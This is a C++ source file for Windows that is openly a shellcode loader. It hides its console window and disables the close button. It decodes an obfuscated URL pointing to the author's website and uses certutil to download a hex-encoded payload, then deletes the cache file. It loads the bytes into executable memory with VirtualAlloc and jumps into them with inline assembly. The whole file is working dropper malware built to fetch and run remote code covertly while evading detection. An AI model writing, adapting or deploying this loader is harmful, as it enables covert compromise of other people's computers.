#include<windows.h>
#include<bits/stdc++.h>
using namespace std;


/// @brief forbid the close button
/// @return none
VOID KillConsoleCloseButton()
{
    HWND hwnd = GetConsoleWindow();
    HMENU hmenu = GetSystemMenu(hwnd, FALSE);
    if (hmenu != NULL)
    {
        DeleteMenu(hmenu, SC_CLOSE, MF_BYCOMMAND);
    }
}


/// @brief uncode the url
/// @param str the encoded str
void uncode(char str[])
{
    for (int i=0,j=0;i<strlen(str);i++,j++)
    {
        if (i%2==0)
        {
            str[i] = str[i] - j;
        }
        if (i%2!=0)
        {
            str[i] = str[i] + j;
        }
        if (j==2)
        {
            j = -1;
        }
    }
}

/// @brief download the shellcode from my website
void download()
{
    char str1[] = "hsvpt";
    char str2[] = "zgcnhny/";
    char str3[] = "ghvhv`";
    char str4[] = "in";
    char str5[] = "tqcntkiruipl";
    char str6[] = "0/2";
    char str7[] = "twv";

    uncode(str1);
    uncode(str2);
    uncode(str3);
    uncode(str4);
    uncode(str5);
    uncode(str6);
    uncode(str7);

    string buf1,buf2,buf3,buf4,buf5,buf6,buf7,buf8,buf9,buf10,url;
    buf1 = str1;
    buf2 = str2;
    buf3 = str3;
    buf4 = str4;
    buf5 = str5;
    buf6 = str6;
    buf7 = str7;
    buf8 = "://";
    buf9 = ".";
    buf10 = "/";
    url = buf1 + buf8 + buf2 + buf9 + buf3 + buf9 + buf4 + buf10 + buf5 + buf10 + buf6 + buf9 + buf7;

    string cmd1 = "certutil -urlcache -split -f ";
    string cmd2 = " > t.tmp";
    string command1 = cmd1 + url + cmd2;
    system(command1.data());
    system("del t.tmp");
}

/// @brief remove the cache generated in file process
void rm_cache()
{
    string command2 = "rm -r -f 000.txt";
    system(command2.data());
} 

/// @brief delete the specific char from a str
/// @param c the str
/// @param unneed the unneed char
void delete_(char *c,char unneed)
{
	int i,j=0,k,m;
	 
	for (i=0;;i++)
	{
		if (c[i]==unneed)
		{
			j++;			
		}
		if (c[i+1]=='\0')
		{
			break;
		}
	}
	if (c[i]==unneed)
	{
		c[i]='\0';
	}
	for (k=i-1;k>=0;k--)
	{
		if (c[k]==unneed)
		{
			for(m=k;;m++)
			{
				c[m]=c[m+1];
				if (c[m+1]=='\0')
				{
					break;
				}
			}
		}
	}
}
/// @brief transform char into int  
/// @param a the char
/// @return the number transformed
int transform_1(char a)
{
    if (a>='0'&&a<='9')
    {
        return a - '0';
    }
    if (a>='a'&&a<='f')
    {
        return a - 'a'+ 10;
    }
    else
    return -1;
}

int transform_2(char *b)
{
    int n1 = transform_1(b[0]);
    int n2 = transform_1(b[1]);
    return n1*16+n2;
}

void transform_3(int *num,int size,unsigned char *str)
{
    for (int i=0;i<size;i++)
    {
        str[i] = (unsigned char)num[i];
    }
}

/// @brief get the unsigned char []
/// @param buf the resulting buf
void transform_(unsigned char *buf)
{
    download();

    char *str = (char *)malloc(4850);
    ifstream file;
    file.open("000.txt",ios::in);
    file.getline(str,4850,';');
    file.close();

    rm_cache();
    delete_(str,'"');
    delete_(str,'\n');
    delete_(str,'\\');
    delete_(str,'x');

    char a[1144][2];
    for (int i=0;i<1144;i++)
    {
        a[i][0] = str[2*i];
        a[i][1] = str[2*i+1];
    }

    int b[1144];

    for (int i=0;i<1144;i++)
    {
        b[i] = transform_2(a[i]);
    }

    transform_3(b,1144,buf);
    buf[1144] = (unsigned char)0;
}


int main()
{
	KillConsoleCloseButton();
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	unsigned char buf[1145];
	transform_(buf);
    void* shellcodePtr = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(shellcodePtr, buf, sizeof(buf));

	__asm__("movq %0,%%rax\n\t"
	        "jmp *%%rax"
	        :
	        : "r"(shellcodePtr)
	        : "%rax"
	);

//    VirtualFree(shellcodePtr, 0, MEM_RELEASE);
    return 0;
}
